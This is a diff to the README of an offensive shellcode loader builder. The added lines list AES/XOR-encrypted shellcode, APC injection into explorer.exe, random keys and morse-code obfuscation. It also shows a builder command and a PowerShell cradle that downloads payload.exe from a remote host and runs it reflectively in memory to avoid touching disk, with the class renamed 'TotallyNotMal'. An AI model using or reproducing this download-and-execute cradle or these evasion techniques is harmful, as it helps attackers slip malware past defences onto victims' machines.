@@ -4,8 +4,11 @@
 ![](./src/images/scan.PNG)
 
 ### Functionalities
+* Support multiple shellcode input
 * AES + XOR encrypted shellcode
 * APC Process Injection (explorer.exe)
+* Random generated AES key and iv
+* Final Shellcode, Key and IV are translated to morse code :)
 
 ### Usage
 ```
@@ -20,7 +23,6 @@ Sharperner.exe /file:file.txt /key:'l0v3151nth3a1ry000www' /out:payload.exe
 
 ### To-do
 * Implement c++ dropper
-* Supports raw payload as input
 * Implement direct syscalls
 * Process Hollowing, PID spoofing
 
@@ -29,5 +31,5 @@ To avoid touching the disk, Generated .NET executable can be loaded reflectively
 ```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
-[beacon.Program]::Main()
+[TotallyNotMal.Program]::Main()
 ```
